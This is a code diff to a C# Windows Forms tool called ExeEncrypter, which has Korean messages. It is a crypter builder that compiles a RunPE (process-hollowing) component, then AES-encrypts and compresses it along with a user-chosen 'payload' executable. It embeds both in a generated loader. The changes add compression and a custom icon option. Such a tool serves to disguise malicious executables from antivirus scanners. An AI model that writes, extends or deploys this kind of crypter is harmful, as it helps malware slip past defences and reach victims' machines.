@@ -3,6 +3,7 @@ using System;
 using System.CodeDom.Compiler;
 using System.Collections.Generic;
 using System.IO;
+using System.IO.Compression;
 using System.Reflection;
 using System.Resources;
 using System.Security.Cryptography;
@@ -13,6 +14,7 @@ namespace ExeEncrypter
 {
     public partial class Form1 : MetroFramework.Forms.MetroForm
     {
+
         public Form1()
         {
             InitializeComponent();
@@ -20,6 +22,10 @@ namespace ExeEncrypter
             FilePathTextbox.AllowDrop = true;
             FilePathTextbox.DragEnter += new DragEventHandler(DragEnter);
             FilePathTextbox.DragDrop += new DragEventHandler(DragDrop);
+
+            IconTextbox.AllowDrop = true;
+            IconTextbox.DragEnter += new DragEventHandler(DragEnter);
+            IconTextbox.DragDrop += new DragEventHandler(IconDragDrop);
         }
 
         void DragEnter(object sender, DragEventArgs e)
@@ -27,6 +33,29 @@ namespace ExeEncrypter
             if (e.Data.GetDataPresent(DataFormats.FileDrop)) e.Effect = DragDropEffects.Copy;
         }
 
+
+        void IconDragDrop(object sender, DragEventArgs e)
+        {
+            string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
+
+            if (files.Length == 1)
+            {
+                string file = files[0];
+
+                if (Path.GetExtension(file) != ".ico")
+                {
+                    MessageBox.Show("확장자가 .ico가 아닙니다.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+                else
+                {
+                    IconTextbox.Text = file;
+                }
+            }
+            else
+            {
+                MessageBox.Show("아이콘을 하나만 드래그 해주세요.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
 
         void DragDrop(object sender, DragEventArgs e)
         {
@@ -82,6 +111,10 @@ namespace ExeEncrypter
             {
                 MessageBox.Show("키에 #이 있습니다.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
+            else if (KeyTextbox.Text.Contains("\""))
+            {
+                MessageBox.Show("키에 \"이 있습니다.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
             else
             {
                 Compile(FilePathTextbox.Text);
@@ -122,7 +155,7 @@ namespace ExeEncrypter
                     IncludeDebugInformation = false,
                     TempFiles = new TempFileCollection(BuildPath, false),
                 };
-                
+
 
                 CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, Properties.Resources.RunPE);
                 if (compilerResults.Errors.Count > 0)
@@ -133,13 +166,17 @@ namespace ExeEncrypter
                             compilerError.Line, compilerError.Column, compilerError.FileName));
                     }
                     return;
-                } else
+                }
+                else
                 {
                     MessageBox.Show("RunPE Build success");
                 }
             }
-            
+
             compilerOptions = "/target:winexe /platform:x86 /optimize+";
+            if (IconTextbox.Text != "") {
+                compilerOptions += " /win32icon:\""+IconTextbox.Text+"\"";
+            }
             MessageBox.Show("Program Build start");
 
             using (CSharpCodeProvider cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
@@ -153,15 +190,16 @@ namespace ExeEncrypter
                     IncludeDebugInformation = false,
                     TempFiles = new TempFileCollection(BuildPath, false),
                 };
-
+                
                 using (ResourceWriter rw = new ResourceWriter(Path.Combine(BuildPath, Path.GetFileNameWithoutExtension(payloadPath) + ".resources")))
                 {
-                    rw.AddResource("RunPE", AES_Encrypt(File.ReadAllBytes(Path.Combine(BuildPath, "RunPE.dll")),KeyTextbox.Text));
-                    rw.AddResource("payload", AES_Encrypt(File.ReadAllBytes(FilePathTextbox.Text), KeyTextbox.Text));
+                    rw.AddResource("RunPE", AES_Encrypt(CompressByte(File.ReadAllBytes(Path.Combine(BuildPath, "RunPE.dll"))), KeyTextbox.Text));
+                    rw.AddResource("payload", AES_Encrypt(CompressByte(File.ReadAllBytes(FilePathTextbox.Text)), KeyTextbox.Text));
                     rw.Generate();
                 }
 
                 compilerParameters.EmbeddedResources.Add(Path.Combine(BuildPath, Path.GetFileNameWithoutExtension(payloadPath) + ".resources"));
+                
                 var Loader = Properties.Resources.Loader.Replace("#filename", Path.GetFileNameWithoutExtension(payloadPath)).Replace("#password", KeyTextbox.Text);
                 //MessageBox.Show(Loader);
                 CompilerResults compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, Loader);
@@ -210,5 +248,34 @@ namespace ExeEncrypter
             }
             return encryptedBytes;
         }
+
+        void IconBtn_Click(object sender, EventArgs e)
+        {
+            if (openIcon.ShowDialog() == DialogResult.OK)
+            {
+                string file = openIcon.FileName;
+
+                if (Path.GetExtension(file) != ".ico")
+                {
+                    MessageBox.Show("확장자가 .ico가 아닙니다.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                }
+                else
+                {
+                    IconTextbox.Text = file;
+                }
+            }
+        }
+
+        public static byte[] CompressByte(byte[] data)
+        {
+            MemoryStream output = new MemoryStream();
+            using (DeflateStream dstream = new DeflateStream(output, CompressionLevel.Optimal))
+            {
+                dstream.Write(data, 0, data.Length);
+            }
+            return output.ToArray();
+        }
+
+
     }
 }
